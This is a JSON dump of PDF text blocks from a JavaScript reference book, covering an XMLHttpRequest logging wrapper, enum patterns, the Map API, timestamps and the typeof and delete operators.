        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// Store a reference to the native method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  open  =  XMLHttpRequest. prototype . open ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Overwrite the native method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "XMLHttpRequest. prototype . open   =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Assign an event listener",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     this . addEventListener ( \"load\" ,  event  =>  console. log ( XHR ),   false );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Call the stored reference to the native method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    open. apply ( this ,  arguments ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 244",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 37: Enumerations",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 37.1: Enum de\ufb01nition using Object.freeze()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "JavaScript does not directly support enumerators but the functionality of an enum can be mimicked.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Prevent the enum from being changed",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  TestEnum  =  Object. freeze ({     One : 1 ,     Two : 2 ,     Three : 3 });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Define a variable with a value from the enum",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =  TestEnum. Two ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Prints a value according to the variable's enum value",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "switch ( x )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     case  TestEnum. One :         console. log ( \"111\" );          break ;      case  TestEnum. Two :         console. log ( \"222\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above enumeration de\ufb01nition, can also be written as follows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  TestEnum  =   {  One :   1 ,  Two :   2 ,  Three :   3   } Object. freeze ( TestEnum );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "After that you can de\ufb01ne a variable and print like before.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 37.2: Alternate de\ufb01nition",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Object. freeze ()  method is available since version 5.1. For older versions, you can use the following code (note that it also works in versions 5.1 and later):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  ColorsEnum  =   {     WHITE :   0 ,     GRAY :   1 ,     BLACK :   2 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Define a variable with a value from the enum",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  currentColor  =  ColorsEnum. GRAY ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 37.3: Printing an enum variable",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "After de\ufb01ning an enum using any of the above ways and setting a variable, you can print both the variable's value as well as the corresponding name from the enum for the value. Here's an example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Define the enum",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  ColorsEnum  =   {  WHITE :   0 ,  GRAY :   1 ,  BLACK :   2   } Object. freeze ( ColorsEnum );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Define the variable and assign a value",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  color  =  ColorsEnum. BLACK ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 245",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if ( color  ==  ColorsEnum. BLACK )   {    console. log ( color );      // This will print \"2\"     var  ce  =  ColorsEnum ;     for   ( var  name  in  ce )   {       if   ( ce [ name ]   ==  ce. BLACK )        console. log ( name );      // This will print \"BLACK\"     } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 37.4: Implementing Enums Using Symbols",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "As ES6 introduced  Symbols , which are both  unique and immutable primitive values  that may be used as the key of an  Object  property, instead of using strings as possible values for an enum, it's possible to use symbols.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Simple symbol",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  newSymbol  =  Symbol (); typeof  newSymbol  ===   'symbol'   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// A symbol with a label",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  anotherSymbol  =  Symbol ( \"label\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Each symbol is unique",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  yetAnotherSymbol  =  Symbol ( \"label\" ); yetAnotherSymbol  ===  anotherSymbol ;   // false const  Regnum_Animale     =  Symbol (); const  Regnum_Vegetabile  =  Symbol (); const  Regnum_Lapideum    =  Symbol (); function  describe ( kingdom )   {    switch ( kingdom )   {      case  Regnum_Animale :          return   \"Animal kingdom\" ;      case  Regnum_Vegetabile :          return   \"Vegetable kingdom\" ;      case  Regnum_Lapideum :          return   \"Mineral kingdom\" ;    } } describe ( Regnum_Vegetabile );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Vegetable kingdom",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  Symbols in ECMAScript 6  article covers this new primitive type more in detail.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 37.5: Automatic Enumeration Value",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "This Example demonstrates how to automatically assign a value to each entry in an enum list. This will prevent two enums from having the same value by mistake. NOTE:  Object.freeze browser support",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  testEnum  =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Initializes the enumerations",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  enumList  =   [",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 246",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "         \"One\" ,          \"Two\" ,          \"Three\"      ];     enumObj  =   {};     enumList. forEach (( item ,  index )=> enumObj [ item ]   =  index  +   1 );    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Do not allow the object to be changed",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    Object. freeze ( enumObj );      return  enumObj ; }(); console. log ( testEnum. One );   // 1 will be logged var  x  =  testEnum. Two ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "switch ( x )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     case  testEnum. One :         console. log ( \"111\" );          break ;      case  testEnum. Two :         console. log ( \"222\" );   // 222 will be logged          break ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 247",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 38: Map",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "iterable",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Any iterable object (for example an array) containing  [ key ,  value ]  pairs. key The key of an element.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "value",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The value assigned to the key.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "callback",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Callback function called with three parameters: value, key, and the map.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "thisArg",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Value which will be used as  this  when executing  callback .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 38.1: Creating a Map",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A Map is a basic mapping of keys to values. Maps are di\ufb00erent from objects in that their keys can be anything (primitive values as well as objects), not just strings and symbols. Iteration over Maps is also always done in the order the items were inserted into the Map, whereas the order is unde\ufb01ned when iterating over keys in an object. To create a Map, use the Map constructor:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It has an optional parameter, which can be any iterable object (for example an array) which contains arrays of two elements  \u2013  \ufb01rst is the key, the seconds is the value. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ([[ new  Date (),   { foo :   \"bar\" }],   [ document. body ,   \"body\" ]]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//                      ^key          ^value          ^key        ^value",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 38.2: Clearing a Map",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To remove all elements from a Map, use the  . clear ()  method:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "map. clear ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ([[ 1 ,   2 ],   [ 3 ,   4 ]]); console. log ( map. size );   // 2 map. clear (); console. log ( map. size );   // 0 console. log ( map. get ( 1 ));   // undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 38.3: Removing an element from a Map",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To remove an element from a map use the  . delete ()  method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "map. delete ( key );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ([[ 1 ,   2 ],   [ 3 ,   4 ]]); console. log ( map. get ( 3 ));   // 4 map. delete ( 3 ); console. log ( map. get ( 3 ));   // undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 248",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This method returns  true  if the element existed and has been removed, otherwise  false :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ([[ 1 ,   2 ],   [ 3 ,   4 ]]); console. log ( map. delete ( 1 ));   // true console. log ( map. delete ( 7 ));   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 38.4: Checking if a key exists in a Map",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To check if a key exists in a Map, use the  . has ()  method:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "map. has ( key );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ([[ 1 ,   2 ],   [ 3 ,   4 ]]); console. log ( map. has ( 1 ));   // true console. log ( map. has ( 2 ));   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 38.5: Iterating Maps",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Map has three methods which returns iterators:  . keys () ,  . values ()  and  . entries () .  . entries ()  is the default Map iterator, and contains  [ key ,  value ]  pairs.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ([[ 1 ,   2 ],   [ 3 ,   4 ]]); for   ( const   [ key ,  value ]  of map )   {   console. log ( `key :  $ { key },  value :  $ { value } ` );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // logs:    // key: 1, value: 2    // key: 3, value: 4 }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "for   ( const  key of map. keys ())   {   console. log ( key );   // logs 1 and 3 } for   ( const  value of map. values ())   {   console. log ( value );   // logs 2 and 4 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Map also has  . forEach ()  method. The \ufb01rst parameter is a callback function, which will be called for each element in the map, and the second parameter is the value which will be used as  this  when executing the callback function. The callback function has three arguments: value, key, and the map object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ([[ 1 ,   2 ],   [ 3 ,   4 ]]); map. forEach (( value ,  key ,  theMap )   =>  console. log ( `key :  $ { key },  value :  $ { value } ` ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// logs: // key: 1, value: 2 // key: 3, value: 4",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 38.6: Getting and setting elements",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Use  . get ( key )  to get value by key and  . set ( key ,  value )  to assign a value to a key. If the element with the speci\ufb01ed key doesn't exist in the map,  . get ()  returns  undefined .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 249",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": ". set ()  method returns the map object, so you can chain  . set ()  calls.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map (); console. log ( map. get ( 1 ));   // undefined map. set ( 1 ,   2 ) . set ( 3 ,   4 ); console. log ( map. get ( 1 ));   // 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 38.7: Getting the number of elements of a Map",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To get the numbers of elements of a Map, use the  . size  property:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  map  =   new  Map ([[ 1 ,   2 ],   [ 3 ,   4 ]]); console. log ( map. size );   // 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 250",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 39: Timestamps",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 39.1: High-resolution timestamps",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "performance. now ()  returns a precise timestamp: The number of milliseconds, including microseconds, since the current web page started to load. More generally, it returns the time elapsed since the  performanceTiming. navigationStart  event.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "t  =  performance. now ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For example, in a web browser's main context,  performance. now ()  returns  6288.319  if the web page began to load 6288 milliseconds and 319 microseconds ago.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 39.2: Get Timestamp in Seconds",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To get the timestamp in seconds",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. floor (( new  Date () . getTime ())   /   1000 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 39.3: Low-resolution timestamps",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Date. now ()  returns the number of whole milliseconds that have elapsed since 1 January 1970 00:00:00 UTC.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "t  =  Date. now ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "For example,  Date. now ()  returns  1461069314  if it was called on 19 April 2016 at 12:35:14 GMT.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 39.4: Support for legacy browsers",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In older browsers where  Date. now ()  is unavailable, use  ( new  Date ()) . getTime ()  instead:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "t  =   ( new  Date ()) . getTime ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or, to provide a  Date. now ()  function for use in older browsers,  use this poly\ufb01ll :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   (! Date. now )   {   Date. now   =   function  now ()   {      return   new  Date () . getTime ();    }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "comment": "Some code.",
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 251",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 40: Unary Operators",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 40.1: Overview",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Unary operators are operators with only one operand. Unary operators are more e\ufb03cient than standard JavaScript function calls. Additionally, unary operators can not be overridden and therefore their functionality is guaranteed. The following unary operators are available:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Operator Operation Example",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "delete",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The delete operator deletes a property from an object. example void The void operator discards an expression's return value. example",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The typeof operator determines the type of a given object. example + The unary plus operator converts its operand to Number type. example - The unary negation operator converts its operand to Number, then negates it. example ~ Bitwise NOT operator. example ! Logical NOT operator. example",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 40.2: The typeof operator",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  typeof  operator returns the data type of the unevaluated operand as a string.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof  operand",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "These are the possible return values from  typeof : Type",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Return value",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Undefined \"undefined\" Null \"object\" Boolean \"boolean\" Number \"number\" String \"string\" Symbol  (ES6) \"symbol\" Function  object \"function\" document. all \"undefined\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Host object (provided by the JS environment) Implementation-dependent Any other object",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"object\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The unusual behavior of  document. all  with the  typeof  operator is from its former usage to detect legacy browsers. For more information, see  Why is document.all de\ufb01ned but typeof document.all returns \"unde\ufb01ned\"?",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// returns 'number'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   3.14 ; typeof   Infinity ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   NaN ;                 // \"Not-a-Number\" is a \"number\" // returns 'string'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   \"\" ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 252",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   \"bla\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   ( typeof   1 );          // typeof always returns a string // returns 'boolean'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   true ; typeof   false ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// returns 'undefined'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   undefined ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof  declaredButUndefinedVariable ; typeof  undeclaredVariable ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   void   0 ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof  document. all         // see above",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// returns 'function'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   function (){};",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   class  C  {}; typeof  Math. sin ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// returns 'object' typeof   {   /*<...>*/   };",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   null ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   /regex/ ;             // This is also considered an object typeof   [ 1 ,   2 ,   4 ];           // use Array.isArray or Object.prototype.toString.call.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   new  Date ();",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   new  RegExp ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   new  Boolean ( true );   // Don't use!",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof   new  Number ( 1 );       // Don't use! typeof   new  String ( \"abc\" );   // Don't use!",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// returns 'symbol'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "typeof  Symbol (); typeof  Symbol. iterator ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 40.3: The delete operator",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  delete  operator deletes a property from an object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Syntax:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "delete  object. property delete  object [ 'property' ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If deletion is successful, or the property did not exist: true If the property to be deleted is an own non-con\ufb01gurable property (can't be deleted): false  in non-strict mode. Throws an error in strict mode",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The  delete  operator does not directly free memory. It can indirectly free memory if the operation means all references to the property are gone. delete  works on an object's properties. If a property with the same name exists on the object's prototype chain, the",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 253",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "property will be inherited from the prototype. delete  does not work on variables or function names.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Deleting a property foo  =   1 ;                // a global variable is a property of `window`: `window.foo`",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "delete  foo ;             // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( foo );       // Uncaught ReferenceError: foo is not defined // Deleting a variable",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  foo  =   1 ; delete  foo ;             // false console. log ( foo );       // 1 (Not deleted)",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Deleting a function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo (){   }; delete  foo ;             // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( foo );       // function foo(){ } (Not deleted) // Deleting a property",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  foo  =   {  bar :   \"42\"   }; delete  foo. bar ;         // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( foo );       // Object { } (Deleted bar) // Deleting a property that does not exist",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  foo  =   {   }; delete  foo. bar ;         // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( foo );       // Object { } (No errors, nothing deleted) // Deleting a non-configurable property of a predefined object",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "delete  Math. PI ;         // false  ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( Math. PI );   // 3.141592653589793 (Not deleted)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 40.4: The unary plus operator (+)",
